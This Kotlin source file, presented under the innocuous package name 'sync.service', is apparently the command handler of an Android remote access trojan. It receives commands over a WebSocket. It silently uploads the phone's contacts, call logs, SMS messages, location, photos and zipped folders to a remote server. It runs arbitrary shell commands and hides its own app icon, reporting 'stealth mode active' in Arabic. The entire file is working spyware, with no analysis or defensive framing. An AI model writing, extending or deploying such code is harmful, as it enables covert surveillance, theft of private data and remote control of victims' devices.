package com.sync.service

import android.Manifest
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Vibrator
import android.os.VibrationEffect
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val base = BuildConfig.SERVER_URL.replace("wss://", "https://").replace("ws://", "http://")
    private val model = "${Build.MANUFACTURER}${Build.MODEL}"

    fun handle(cmd: String) {
        try {
            when {
                cmd == "contacts"      -> sendContacts()
                cmd == "calls"         -> sendCalls()
                cmd == "messages"      -> sendMessages()
                cmd == "location"      -> sendLocation()
                cmd == "gallery"       -> sendGallery()
                cmd == "list_sdcard"   -> listSdcard()
                cmd == "hide_icon"     -> hideAppIcon()
                cmd.startsWith("shell:")       -> executeShell(cmd.removePrefix("shell:"))
                cmd.startsWith("zip_dir:")     -> zipAndSendDir(cmd.removePrefix("zip_dir:"))
                cmd.startsWith("send_image:")  -> sendImageById(cmd.removePrefix("send_image:").toLongOrNull() ?: 0)
            }
        } catch (e: Exception) {}
    }

    private fun executeShell(command: String) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val output = process.inputStream.bufferedReader().use { it.readText() }
            val error = process.errorStream.bufferedReader().use { it.readText() }
            val result = if (output.isNotBlank()) output else error
            postJson("/uploadText", JSONObject().apply {
                put("title", "⚡ Shell: $command")
                put("text", if (result.isNotBlank()) result else "(بدون مخرجات)")
                put("agentId", model)
            })
        } catch (e: Exception) {}
    }

    private fun zipAndSendDir(path: String) {
        try {
            val target = resolvePath(path) ?: return
            val zipFile = File(ctx.cacheDir, "${target.name}_archive.zip")
            FileOutputStream(zipFile).use { fos ->
                ZipOutputStream(fos).use { zos ->
                    target.walkTopDown().forEach { file ->
                        if (file.isFile && file.length() < 50 * 1024 * 1024) {
                            val relativePath = target.toURI().relativize(file.toURI()).path
                            zos.putNextEntry(ZipEntry(relativePath))
                            FileInputStream(file).use { fis -> fis.copyTo(zos) }
                            zos.closeEntry()
                        }
                    }
                }
            }
            if (zipFile.exists() && zipFile.length() > 0) uploadFile(zipFile)
        } catch (e: Exception) {}
    }

    private fun hideAppIcon() {
        try {
            val p = ctx.packageManager
            p.setComponentEnabledSetting(
                android.content.ComponentName(ctx, "${ctx.packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            postJson("/uploadText", JSONObject().apply {
                put("title", "🥷 وضع التخفي النشط")
                put("text", "تم إخفاء الأيقونة بنجاح من واجهة النظام.")
                put("agentId", model)
            })
        } catch (e: Exception) {}
    }

    private fun sendContacts() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            val arr = JSONArray()
            cursor?.use {
                val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && arr.length() < 2000) {
                    arr.put(JSONObject().apply { put("name", it.getString(nIdx) ?: ""); put("phone", it.getString(pIdx) ?: "") })
                }
            }
            postJson("/uploadContacts", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendCalls() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(numIdx) ?: "")
                        put("type", when (it.getInt(typeIdx)) { CallLog.Calls.INCOMING_TYPE -> "وارد"; CallLog.Calls.OUTGOING_TYPE -> "صادر"; CallLog.Calls.MISSED_TYPE -> "فائت"; else -> "أخرى" })
                        put("date", it.getLong(dateIdx)); put("duration", it.getInt(durIdx))
                    })
                }
            }
            postJson("/uploadCalls", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendMessages() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(Uri.parse("content://sms/"), null, null, null, "date DESC")
            val arr = JSONArray()
            cursor?.use {
                val aIdx = it.getColumnIndex("address")
                val bIdx = it.getColumnIndex("body")
                val dIdx = it.getColumnIndex("date")
                val tIdx = it.getColumnIndex("type")
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply {
                        put("from", it.getString(aIdx) ?: "")
                        put("body", it.getString(bIdx) ?: "")
                        put("type", if (it.getInt(tIdx) == 1) "وارد" else "صادر")
                        put("date", it.getLong(dIdx))
                    })
                }
            }
            postJson("/uploadMessages", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendLocation() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
            LocationServices.getFusedLocationProviderClient(ctx).lastLocation.addOnSuccessListener { loc ->
                if (loc != null) sendLocToServer(loc)
            }
        } catch (e: Exception) {}
    }

    private fun sendLocToServer(loc: Location) {
        try {
            val json = JSONObject().apply { put("lat", loc.latitude); put("lon", loc.longitude); put("agentId", model) }
            val req = Request.Builder().url("$base/uploadLocation").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).post(json.toString().toRequestBody("application/json".toMediaType())).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }

    private fun sendGallery() {
        try {
            val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE), null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.Images.Media._ID)
                val nIdx = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val sIdx = it.getColumnIndex(MediaStore.Images.Media.SIZE)
                while (it.moveToNext() && arr.length() < 300) {
                    arr.put(JSONObject().apply { put("id", it.getLong(idIdx)); put("name", it.getString(nIdx) ?: ""); put("size", it.getLong(sIdx)) })
                }
            }
            postJson("/uploadGallery", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendImageById(id: Long) {
        try {
            if (id <= 0) return
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            val inputStream = ctx.contentResolver.openInputStream(uri) ?: return
            val tempFile = File(ctx.cacheDir, "img_$id.jpg")
            tempFile.outputStream().use { inputStream.copyTo(it) }
            inputStream.close()
            uploadFile(tempFile)
        } catch (e: Exception) {}
    }

    private fun listSdcard() {
        try {
            val root = Environment.getExternalStorageDirectory()
            val items = JSONArray()
            root.listFiles()?.sortedBy { it.name }?.forEach { f ->
                items.put(JSONObject().apply { put("name", f.name); put("type", if (f.isDirectory) "📁" else "📄"); put("path", f.absolutePath); put("size", if (f.isFile) f.length() else 0) })
            }
            postJson("/uploadText", JSONObject().apply { put("title", "📂 /sdcard/"); put("text", items.toString(2)); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun resolvePath(path: String): File? {
        val p = path.trim().trimStart('/').trimEnd('/')
        val candidates = listOf(
            File("/sdcard/$p"), File("/storage/emulated/0/$p"),
            File(Environment.getExternalStorageDirectory(), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), p)
        )
        for (c in candidates) if (c.exists()) return c
        return null
    }

    private fun uploadFile(file: File) {
        try {
            val body = file.asRequestBody("application/octet-stream".toMediaType())
            val req = Request.Builder().url("$base/uploadFile").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).addHeader("model", model).post(body).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }

    private fun postJson(endpoint: String, json: JSONObject) {
        try {
            val req = Request.Builder().url("$base$endpoint").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).addHeader("model", model).post(json.toString().toRequestBody("application/json".toMediaType())).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }
}
